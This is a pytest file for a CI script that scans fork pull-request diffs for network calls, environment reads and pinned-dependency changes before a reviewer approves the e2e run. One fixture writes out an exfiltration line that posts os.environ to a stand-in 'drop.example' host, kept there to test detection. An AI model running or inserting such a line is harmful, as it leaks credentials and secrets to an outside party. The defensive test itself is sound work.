"""pytest: the fork-PR pre-approval scan reports what e2e will execute, and blocks on pinned deps.

``.github/scripts/fork_pr_scan.py`` is what turns "read the fork's diff before clicking approve" into
a short list, so its line numbers must be right (a wrong number sends the reviewer to the wrong line)
and the one BLOCKING case -- a change to the pinned conformance requirements -- must stay blocking.
"""

import importlib.util
from pathlib import Path

SCRIPT = Path(__file__).resolve().parent.parent / ".github" / "scripts" / "fork_pr_scan.py"

_spec = importlib.util.spec_from_file_location("fork_pr_scan", SCRIPT)
scan = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(scan)


def _file(path, patch):
    return {"filename": path, "patch": patch}


def test_added_line_numbers_follow_the_hunk_header():
    patch = "@@ -10,3 +20,4 @@\n context\n+added one\n context\n+added two\n"
    assert scan.added_lines(patch) == [(21, "added one"), (23, "added two")]


def test_deleted_lines_do_not_advance_the_counter():
    patch = "@@ -1,3 +1,2 @@\n-gone\n+kept\n"
    assert scan.added_lines(patch) == [(1, "kept")]


def test_reports_network_and_env_reads_in_executed_paths():
    body, blocking = scan.build_report([
        _file("tests/e2e_test.py", '@@ -1,0 +5,2 @@\n+    requests.post("https://drop.example/x", data=os.environ)\n'),
        _file(".github/scripts/mcp_watchdog_deploy.sh", '@@ -1,0 +9,1 @@\n+  curl -s "$WATCHDOG_URL" >/dev/null\n'),
    ])
    assert not blocking
    # One line doing both must carry BOTH kinds -- reporting only the first hides half of it.
    assert "tests/e2e_test.py` | 5 | env read + network |" in body
    assert ".github/scripts/mcp_watchdog_deploy.sh` | 9 | env read + network |" in body


def test_naming_a_library_in_an_except_clause_is_not_a_network_call():
    body, _ = scan.build_report([
        _file("tests/e2e_test.py", "@@ -1,0 +7,1 @@\n+        except (McpError, requests.HTTPError) as exc:\n"),
    ])
    assert "No network calls, environment reads, or dependency changes" in body, (
        "an exception clause that merely names requests is noise; the list has to stay worth reading"
    )


def test_real_request_calls_and_imports_are_still_reported():
    body, _ = scan.build_report([
        _file("tests/e2e_test.py", '@@ -1,0 +3,2 @@\n+import socket\n+    httpx.post(url, json=payload)\n'),
    ])
    assert "| 3 | network |" in body
    assert "| 4 | network |" in body


def test_ignores_paths_the_e2e_job_does_not_execute():
    body, blocking = scan.build_report([
        _file("README.md", '@@ -1,0 +1,1 @@\n+see https://example.com and os.environ\n'),
        _file("libraries/mcp-rooms-lib.groovy", '@@ -1,0 +1,1 @@\n+  httpGet("https://example.com")\n'),
    ])
    assert not blocking
    assert "nothing the e2e job executes from this PR changed" in body
    assert "README.md" not in body


def test_comment_only_additions_are_not_findings():
    body, _ = scan.build_report([
        _file("tests/e2e_test.py", '@@ -1,0 +3,1 @@\n+# talks to https://example.com via requests\n'),
    ])
    assert "No network calls, environment reads, or dependency changes" in body


def test_requirements_change_blocks_even_with_no_pattern_hit():
    body, blocking = scan.build_report([
        _file(scan.HARD_FAIL_PATH, "@@ -23,1 +23,1 @@\n-mcp==2.0.0\n+mcp==2.0.1\n"),
    ])
    assert blocking, "a pinned-dependency change must fail the scan, not merely appear in the list"
    assert "Blocking" in body


def test_a_watched_file_without_a_patch_blocks_instead_of_reporting_clean():
    # The API omits `patch` on an oversized or binary diff; a clean-looking report over code nobody
    # read is worse than no report, so it must block.
    body, blocking = scan.build_report([{"filename": "tests/e2e_test.py", "status": "modified"}])
    assert blocking
    assert "no diff available" in body
    assert "No network calls, environment reads, or dependency changes" not in body


def test_a_deleted_watched_file_does_not_block():
    body, blocking = scan.build_report([{"filename": ".github/scripts/old.sh", "status": "removed"}])
    assert not blocking
    assert "no diff available" not in body


def test_marker_is_present_so_the_comment_is_updated_in_place():
    body, _ = scan.build_report([])
    assert body.startswith(scan.MARKER)
